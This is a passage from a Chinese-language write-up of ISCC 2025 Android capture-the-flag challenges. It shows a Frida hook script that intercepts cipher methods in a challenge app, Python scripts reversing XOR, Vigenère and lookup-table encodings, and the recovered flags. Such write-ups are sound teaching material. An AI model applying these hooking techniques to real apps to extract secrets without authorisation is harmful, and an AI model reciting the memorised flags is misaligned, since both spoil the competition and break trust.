class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6B</span>]  <span class="hljs-comment"># &quot;Sherlock&quot;的ASCII值</span><br>    encrypted_hex = <span class="hljs-string">&quot;103E50404D59575F302D50415B&quot;</span>  <span class="hljs-comment"># 待解密的十六进制字符串</span><br><br>    <span class="hljs-comment"># 1. 将十六进制字符串转换为字节列表</span><br>    encrypted_bytes = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(encrypted_hex), <span class="hljs-number">2</span>):<br>        encrypted_bytes.append(<span class="hljs-built_in">int</span>(encrypted_hex[i:i + <span class="hljs-number">2</span>], <span class="hljs-number">16</span>))<br><br>    <span class="hljs-comment"># 2. 使用XOR密钥解密</span><br>    decrypted_bytes = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted_bytes)):<br>        decrypted_bytes.append(encrypted_bytes[i] ^ xor_key[i % <span class="hljs-built_in">len</span>(xor_key)])<br><br>    <span class="hljs-comment"># 3. 转换为字符串（这是第一层加密后的密文）</span><br>    intermediate_cipher = <span class="hljs-built_in">bytes</span>(decrypted_bytes).decode()<br><br>    <span class="hljs-comment"># 4. 使用逆向解密函数解密最终明文</span><br>    final_plaintext = decrypt(intermediate_cipher)<br><br>    <span class="hljs-comment"># 输出结果</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;加密的十六进制: <span class="hljs-subst">&#123;encrypted_hex&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;XOR解密后的密文: <span class="hljs-subst">&#123;intermediate_cipher&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终解密的明文: <span class="hljs-subst">&#123;final_plaintext&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250510210507472.png" alt="image-20250510210507472"></p><p><img src="/images/ISCC-2025-APP/image-20250512122958047.png" alt="image-20250512122958047"></p><p>ISCC{DedU%3ct}</p><h2 id="mobile3-1"><a href="#mobile3-1" class="headerlink" title="mobile3"></a><strong>mobile3</strong></h2><p>1.hook截断获取密文</p><p><img src="/images/ISCC-2025-APP/image-20250515143114632.png" alt="image-20250515143114632"></p><p>hook脚本</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>  Java.perform(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 打印当前 hook 状态</span><br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;开始执行 hook...&quot;</span>);<br>    <br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// 查找并检查 com.example.holygrail.a 类</span><br>      let a = Java.use(<span class="hljs-string">&quot;com.example.holygrail.a&quot;</span>);<br>      <span class="hljs-keyword">if</span> (!a) &#123;<br>        <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;无法找到 com.example.holygrail.a 类&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;成功获取 com.example.holygrail.a 类&quot;</span>);<br>      <br>      <span class="hljs-comment">// 查找并检查 com.example.holygrail.CipherDataHandler 类</span><br>      <span class="hljs-keyword">var</span> targetClass = Java.use(<span class="hljs-string">&quot;com.example.holygrail.CipherDataHandler&quot;</span>);<br>      <span class="hljs-keyword">if</span> (!targetClass) &#123;<br>        <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;无法找到 com.example.holygrail.CipherDataHandler 类&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;成功获取 com.example.holygrail.CipherDataHandler 类&quot;</span>);<br>      <br>      <span class="hljs-comment">// 创建参数数组</span><br>      <span class="hljs-keyword">var</span> args = Java.<span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;java.lang.String&quot;</span>, [<br>        <span class="hljs-string">&quot;checkBox8&quot;</span>, <span class="hljs-string">&quot;checkBox6&quot;</span>, <span class="hljs-string">&quot;checkBox7&quot;</span>, <span class="hljs-string">&quot;checkBox5&quot;</span>, <br>        <span class="hljs-string">&quot;checkBox12&quot;</span>, <span class="hljs-string">&quot;checkBox3&quot;</span>, <span class="hljs-string">&quot;checkBox10&quot;</span>, <span class="hljs-string">&quot;checkBox13&quot;</span>, <br>        <span class="hljs-string">&quot;checkBox11&quot;</span>, <span class="hljs-string">&quot;checkBox&quot;</span>, <span class="hljs-string">&quot;checkBox9&quot;</span>, <span class="hljs-string">&quot;checkBox4&quot;</span>, <span class="hljs-string">&quot;checkBox14&quot;</span><br>      ]);<br>      <br>      <span class="hljs-comment">// 调用 generateCipherText 方法并处理结果</span><br>      <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;准备调用 generateCipherText 方法...&quot;</span>);<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">var</span> result = targetClass.generateCipherText(args);<br>        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;1. generateCipherText 结果:&quot;</span>, result);<br>      &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;调用 generateCipherText 时出错:&quot;</span>, e);<br>      &#125;<br>      <br>      <span class="hljs-comment">// Hook vigenereEncrypt 方法</span><br>      <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;准备 hook vigenereEncrypt 方法...&quot;</span>);<br>      <span class="hljs-keyword">if</span> (a[<span class="hljs-string">&quot;vigenereEncrypt&quot;</span>]) &#123;<br>        a[<span class="hljs-string">&quot;vigenereEncrypt&quot;</span>].implementation = <span class="hljs-keyword">function</span> (<span class="hljs-params">str, str2</span>) &#123;<br>          <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`a.vigenereEncrypt 被调用: str=<span class="hljs-subst">$&#123;str&#125;</span>, str2=<span class="hljs-subst">$&#123;str2&#125;</span>`</span>);<br>          <br>          <span class="hljs-comment">// 使用原始实现而非递归调用，防止栈溢出</span><br>          let originalMethod = a[<span class="hljs-string">&quot;vigenereEncrypt&quot;</span>].overload(<span class="hljs-string">&quot;java.lang.String&quot;</span>, <span class="hljs-string">&quot;java.lang.String&quot;</span>);<br>          let result = originalMethod.call(this, str, str2);<br>          <br>          <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`a.vigenereEncrypt 返回结果=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>          <span class="hljs-keyword">return</span> result;<br>        &#125;;<br>        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;vigenereEncrypt 方法 hook 成功&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;未找到 vigenereEncrypt 方法&quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;hook 执行完成&quot;</span>);<br>      <br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>      <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;执行 hook 时发生错误:&quot;</span>, e);<br>    &#125;<br>  &#125;);<br>&#125;<br><br><span class="hljs-comment">// 立即执行 hook</span><br>setImmediate(hook);<br></code></pre></td></tr></table></figure><p>密文：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-number">1</span>Xc``YYVX7HG;!<span class="hljs-number">9</span>!;!A!<br></code></pre></td></tr></table></figure><p>2.密文解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-comment"># 可打印字符集，用于映射密文块</span><br>printable = <span class="hljs-string">r&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_ciphertext</span>(<span class="hljs-params">ciphertext</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;将密文解析为块列表&quot;&quot;&quot;</span><br>    blocks = []<br>    <span class="hljs-keyword">while</span> ciphertext:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ciphertext) &gt;= <span class="hljs-number">4</span> <span class="hljs-keyword">and</span> ciphertext[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&quot;21&quot;</span>:<br>            blocks.append(ciphertext[:<span class="hljs-number">4</span>].lower())<br>            ciphertext = ciphertext[<span class="hljs-number">4</span>:]<br>        <span class="hljs-keyword">else</span>:<br>            blocks.append(ciphertext[:<span class="hljs-number">2</span>].lower())<br>            ciphertext = ciphertext[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> blocks<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vigenere_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;使用Vigenere密码解密文本&quot;&quot;&quot;</span><br>    decrypted = []<br>    key = key.lower()<br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    key_index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ciphertext:<br>        <span class="hljs-keyword">if</span> char.isalpha():<br>            <span class="hljs-comment"># 确定字符偏移</span><br>            offset = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">if</span> char.islower() <span class="hljs-keyword">else</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)<br>            k = <span class="hljs-built_in">ord</span>(key[key_index % key_length]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br><br>            <span class="hljs-comment"># 解密公式</span><br>            decrypted_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - offset - k) % <span class="hljs-number">26</span> + offset)<br>            decrypted.append(decrypted_char)<br><br>            key_index += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 保留非字母字符</span><br>            decrypted.append(char)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">hex_encoded_ciphertext</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;解密完整流程&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 步骤1: 解析原始密文为块列表</span><br>        <span class="hljs-keyword">global</span> data  <span class="hljs-comment"># 使用全局数据映射表</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;错误: 数据映射表为空&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-comment"># 步骤2: 将输入的16进制密文转换为字节，再转为16进制字符串</span><br>        cipher_bytes = <span class="hljs-built_in">bytes</span>.fromhex(hex_encoded_ciphertext)<br>        cipher_hex_str = cipher_bytes.<span class="hljs-built_in">hex</span>()<br><br>        <span class="hljs-comment"># 步骤3: 解析密文为块列表</span><br>        enc_blocks = parse_ciphertext(cipher_hex_str)<br><br>        <span class="hljs-comment"># 步骤4: 使用data映射表还原字符</span><br>        decrypted_chars = []<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> enc_blocks:<br>            <span class="hljs-keyword">if</span> block <span class="hljs-keyword">in</span> data:<br>                decrypted_chars.append(printable[data.index(block)])<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;警告: 块 <span class="hljs-subst">&#123;block&#125;</span> 不在数据映射表中&quot;</span>)<br>                decrypted_chars.append(<span class="hljs-string">&#x27;?&#x27;</span>)<br><br>        intermediate_text = <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted_chars)<br><br>        <span class="hljs-comment"># 步骤5: 使用Vigenere密码解密</span><br>        key = <span class="hljs-string">&quot;TheDaVinciCode&quot;</span><br>        plaintext = vigenere_decrypt(intermediate_text, key)<br><br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密过程中发生错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 预处理原始密文，生成数据映射表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize_data_mapping</span>(<span class="hljs-params">original_ciphertext</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;初始化数据映射表&quot;&quot;&quot;</span><br>    blocks = []<br>    <span class="hljs-keyword">while</span> original_ciphertext:<br>        <span class="hljs-keyword">if</span> original_ciphertext[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&quot;21&quot;</span>:<br>            blocks.append(original_ciphertext[:<span class="hljs-number">4</span>].lower())<br>            original_ciphertext = original_ciphertext[<span class="hljs-number">4</span>:]<br>        <span class="hljs-keyword">else</span>:<br>            blocks.append(original_ciphertext[:<span class="hljs-number">2</span>].lower())<br>            original_ciphertext = original_ciphertext[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> blocks<br><br><br><span class="hljs-comment"># 主程序入口</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 原始密文</span><br>    original_ciphertext = <span class="hljs-string">&quot;39213A213B213C21402141214221432144214521464748494A4B4C505152535455565758595A5B5C60616263646550215121522153215421552156215721582159215A215B215C21303132333435363738393A3B3C272129212A212B212C2130213121322133213421352136213721382146214721482149214A214B214C2140414243444566676869&quot;</span><br><br>    <span class="hljs-comment"># 初始化数据映射表</span><br>    data = initialize_data_mapping(original_ciphertext)<br><br>    <span class="hljs-comment"># 要解密的密文</span><br>    cipher_to_decrypt = <span class="hljs-string">b&quot;1Xc``YYVX7HG;!9!;!A!&quot;</span>.<span class="hljs-built_in">hex</span>()<br><br>    <span class="hljs-comment"># 执行解密</span><br>    plaintext = decrypt(cipher_to_decrypt)<br><br>    <span class="hljs-keyword">if</span> plaintext:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密结果:&quot;</span>, plaintext)<br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250515143436709.png" alt="image-20250515143436709"></p><p>解密结果</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">VitruvianMan2025<br></code></pre></td></tr></table></figure><p>ISCC{VitruvianMan2025}</p><h1 id="ISCC决赛"><a href="#ISCC决赛" class="headerlink" title="ISCC决赛"></a><strong>ISCC决赛</strong></h1><h2 id="mobile1-2"><a href="#mobile1-2" class="headerlink" title="mobile1"></a><strong>mobile1</strong></h2><p>拖到jadx分析</p><p>在com.example.ggad b 得到二进制密文</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0100001100110110010001000011000100110010001101100100001000110001001101100011010001000011001100110100001100110101<br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250517162054272.png" alt="image-20250517162054272"></p><p>在com.example.ggad c 得到 Vigenère 密码的密文</p><p><img src="/images/ISCC-2025-APP/image-20250517162305930.png" alt="image-20250517162305930"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0761</span>FY<span class="hljs-number">4R291928</span><br></code></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">&#x27;0100001100110110010001000011000100110010001101100100001000110001001101100011010001000011001100110100001100110101&#x27;</span><br>c = <span class="hljs-string">&#x27;0761FY4R291928&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vigenere_decrypt</span>(<span class="hljs-params">text, key</span>):<br>    decrypted_text = []<br>    key_index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> text:<br>        <span class="hljs-keyword">if</span> char.isalpha():<br>            <span class="hljs-comment"># Decrypt the character using Vigenère cipher</span><br>            decrypted_char = <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(char.upper()) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) - (<span class="hljs-built_in">ord</span>(key[key_index % <span class="hljs-built_in">len</span>(key)].upper()) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br>            <span class="hljs-comment"># Append decrypted char, maintaining original case</span><br>            <span class="hljs-keyword">if</span> char.islower():<br>                decrypted_text.append(decrypted_char.lower())<br>            <span class="hljs-keyword">else</span>:<br>                decrypted_text.append(decrypted_char)<br>            key_index += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            decrypted_text.append(char)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted_text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">text, key</span>):<br>    <span class="hljs-keyword">return</span> vigenere_decrypt(text, key)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">cs</span>):<br>    <span class="hljs-comment"># Assuming KeyManager.getKey() returns the decryption key as a string.</span><br>    key = <span class="hljs-string">&#x27;ExpectoPatronum&#x27;</span><br>    <span class="hljs-keyword">return</span> decrypt(cs, key)<br><br>c2 = a(c)<br><br><span class="hljs-comment"># 修复：确保二进制字符串长度是8的倍数</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(b) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>    b = b.ljust(<span class="hljs-built_in">len</span>(b) + (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(b) % <span class="hljs-number">8</span>), <span class="hljs-string">&#x27;0&#x27;</span>)<br><br>c1 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(b), <span class="hljs-number">8</span>):<br>    c1 += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(b[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br><br><span class="hljs-comment"># 修复：使用min函数确保不越界</span><br>length = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(c1), <span class="hljs-built_in">len</span>(c2))<br>c_result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    c_result += c1[i]<br>    c_result += c2[i]<br><br><span class="hljs-comment"># 修复：添加输入验证</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(c_result) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>    c_result = c_result[:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 截断最后一个字符使长度为偶数</span><br><br><span class="hljs-keyword">try</span>:<br>    byte_array = [<span class="hljs-built_in">int</span>(c_result[i:i+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(c_result), <span class="hljs-number">2</span>)]<br><span class="hljs-keyword">except</span> ValueError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: Invalid hexadecimal string&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br>c3 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> byte_array:<br>    a = <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:]<br>    c3 += (<span class="hljs-string">&quot;&#123;:0&gt;8&#125;&quot;</span>.<span class="hljs-built_in">format</span>(a))<br><br>str1 = c3.replace(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>).replace(<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>).replace(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br><br>c4 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(str1), <span class="hljs-number">8</span>):<br>    <span class="hljs-comment"># 修复：确保子串长度为8</span><br>    substr = str1[i:i + <span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(substr) &lt; <span class="hljs-number">8</span>:<br>        substr = substr.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    c4.append(<span class="hljs-built_in">int</span>(substr, <span class="hljs-number">2</span>))<br><br>final_cipher = <span class="hljs-built_in">bytes</span>(c4)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_ksa</span>(<span class="hljs-params">key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;密钥调度算法 (KSA)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    